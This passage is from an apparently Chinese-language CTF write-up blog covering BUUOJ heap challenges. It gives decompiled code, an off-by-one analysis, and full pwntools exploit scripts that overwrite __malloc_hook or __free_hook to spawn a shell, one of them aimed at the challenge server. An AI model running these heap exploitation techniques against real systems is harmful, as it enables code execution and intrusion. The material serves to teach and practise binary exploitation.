class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><span class="hljs-comment">#r=process(&#x27;./simpleheap&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29253</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;choice: &quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;size?&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;choice: &quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;idx?&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;choice: &quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;idx?&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;choice: &quot;</span>)<br>    r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;idx?&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 3</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">b&#x27;\xe1&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 1</span><br><br>view(<span class="hljs-number">2</span>)<br>unsortedbin=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase=unsortedbin-<span class="hljs-number">88</span>-<span class="hljs-number">0x3c4b20</span><br>malloc_hook=libcbase+libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;__malloc_hook-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(malloc_hook))<br><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 4 但是跟#2是同一块地址</span><br><br>delete(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">2</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>ogg=[<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb</span>+p64(libcbase+ogg[<span class="hljs-number">1</span>])+p64(realloc_addr+<span class="hljs-number">12</span>))<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h1><h2 id="checksec-5"><a href="#checksec-5" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">yyyffff<span class="hljs-keyword">@yyyffff-virtual-machine</span>:~/桌面$ checksec heapcreator<br>[*] <span class="hljs-string">&#x27;/home/yyyffff/桌面/heapcreator&#x27;</span><br>    <span class="hljs-attribute">Arch</span>:       amd64-<span class="hljs-number">64</span>-little<br>    <span class="hljs-attribute">RELRO</span>:      Partial RELRO<br>    <span class="hljs-attribute">Stack</span>:      Canary found<br>    <span class="hljs-attribute">NX</span>:         NX enabled<br>    <span class="hljs-attribute">PIE</span>:        No PIE (<span class="hljs-number">0</span>x3ff000)<br>    <span class="hljs-attribute">Stripped</span>:   No<br></code></pre></td></tr></table></figure><p>got 表可写，不过我没用 got 表就是了，但是写 free 的 got 表也是一种方法</p><h2 id="IDA-5"><a href="#IDA-5" class="headerlink" title="IDA"></a>IDA</h2><h3 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  setvbuf(_bss_start, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    menu();<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>    <span class="hljs-keyword">switch</span> ( atoi(buf) )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        create_heap();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        edit_heap();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        show_heap();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        delete_heap();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid Choice&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="create"><a href="#create" class="headerlink" title="create"></a>create</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">create_heap</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">9</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !*(&amp;heaparray + i) )<br>    &#123;<br>      *(&amp;heaparray + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10u</span>LL);<br>      <span class="hljs-keyword">if</span> ( !*(&amp;heaparray + i) )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocate Error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>      &#125;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size of Heap : &quot;</span>);<br>      read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8uLL</span>);<br>      size = atoi(buf);<br>      v0 = (__int64)*(&amp;heaparray + i);<br>      *(_QWORD *)(v0 + <span class="hljs-number">8</span>) = <span class="hljs-built_in">malloc</span>(size);<br>      <span class="hljs-keyword">if</span> ( !*((_QWORD *)*(&amp;heaparray + i) + <span class="hljs-number">1</span>) )<br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Allocate Error&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">2</span>);<br>      &#125;<br>      *(_QWORD *)*(&amp;heaparray + i) = size;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content of heap:&quot;</span>);<br>      read_input(*((<span class="hljs-type">void</span> **)*(&amp;heaparray + i) + <span class="hljs-number">1</span>), size);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;SuccessFul&quot;</span>);<br>      <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v5;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>heaparray 一个在 bss 段上的地址，负责记录管理堆块的指针</p><p>在分配堆块的时候首先会 malloc(0x10) 前 8 字节记录要分配的 size，后 8 字节记录即将要分配的堆的指针，然后将这个 0x10 大小的堆块记录到 heaparray 上</p><p>并且分配堆块的时候没有清空堆块，我们就可以直接分配一个 unsortedbin 范围内的然后释放掉再分配回来就可以得到 libcbase 了</p><h3 id="edit-1"><a href="#edit-1" class="headerlink" title="edit"></a>edit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">edit_heap</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &gt;= <span class="hljs-number">0xA</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;heaparray + v1) )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content of heap : &quot;</span>);<br>    read_input(*((<span class="hljs-type">void</span> **)*(&amp;heaparray + v1) + <span class="hljs-number">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1LL</span>);<span class="hljs-comment">// off-by-one </span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done !&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No such heap !&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>是根据那个 0x10 块中存的指针来修改的，如果说我们可以控制那个指针，就可以在任意位置进行 edit</p><p>而且在 19 行输入的时候，长度多写了 1，造成了 off-by-one </p><h3 id="show"><a href="#show" class="headerlink" title="show"></a>show</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">show_heap</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &gt;= <span class="hljs-number">0xA</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;heaparray + v1) )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Size : %ld\nContent : %s\n&quot;</span>, *(_QWORD *)*(&amp;heaparray + v1), *((<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)*(&amp;heaparray + v1) + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done !&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No such heap !&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">delete_heap</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4uLL</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &gt;= <span class="hljs-number">0xA</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;heaparray + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)*(&amp;heaparray + v1) + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">free</span>(*(&amp;heaparray + v1));<br>    *(&amp;heaparray + v1) = <span class="hljs-number">0LL</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done !&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;No such heap !&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>先 delete 我们存储内容的堆块而后 delete 存储信息的堆</p><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><p>大体上是控制堆块信息里的指针为 free_hook 而后改成 system，写个 &#x2F;bin&#x2F;sh 的堆释放掉即可</p><ul><li>首先需要分配三个堆块，释放掉中间那个拿到 libcbase</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 2</span><br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;aaaaaaab&#x27;</span>)<br>view(<span class="hljs-number">1</span>)<br>r.recvuntil(<span class="hljs-string">&quot;aaab&quot;</span>)<br>unsortedbin=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase=unsortedbin-<span class="hljs-number">88</span>-<span class="hljs-number">0x3c4b20</span><br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libcbase+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;free_hook-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(free_hook))<br></code></pre></td></tr></table></figure><ul><li>然后利用 0 块修改 1 块的堆信息块的 size 为 0xd1，然后释放掉 1 块，这样 unsortedbin 内就会 0xd0-&gt;0x90-&gt;unsortedbin&lt;-0xd1。然后我请求 0x90 大小的块，其中 0x10 的块会在 0x90 中分配，然后 0x90 变为 0x70，不满足接下去要分配的 0x90，所以 0x90 会在 0xd0 中分配，最后将 0x70 的块放入了 smallbins 中，这样就会造成管理堆块信息的块在可写入的块的上方，我们就可以写到 0x10 的块中，就可以写入那个指针，最后将那个指针改为 free_hook，这样下一次修改 1 块修改的就是 free_hook了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">b&#x27;\xd1&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;abcyyy&#x27;</span>)<br>pause()<br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x90</span>)+p64(free_hook))<br>edit(<span class="hljs-number">1</span>,p64(system_addr))<br>edit(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p> <img src="/2025/02/19/buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/f4a27fe8e8cb0040145bf0887d44d21d.png" alt="img"> </p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>r=process(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><span class="hljs-comment">#r=remote(&quot;node5.buuoj.cn&quot;,29054)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Size of Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    r.sendafter(<span class="hljs-string">&quot;Content of heap:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    r.sendafter(<span class="hljs-string">&quot;Content of heap : &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>) <span class="hljs-comment"># 2</span><br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;aaaaaaab&#x27;</span>)<br>view(<span class="hljs-number">1</span>)<br>r.recvuntil(<span class="hljs-string">&quot;aaab&quot;</span>)<br>unsortedbin=u64(r.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase=unsortedbin-<span class="hljs-number">88</span>-<span class="hljs-number">0x3c4b20</span><br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libcbase+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;free_hook-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-comment">#pause()</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">b&#x27;\xd1&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x90</span>,<span 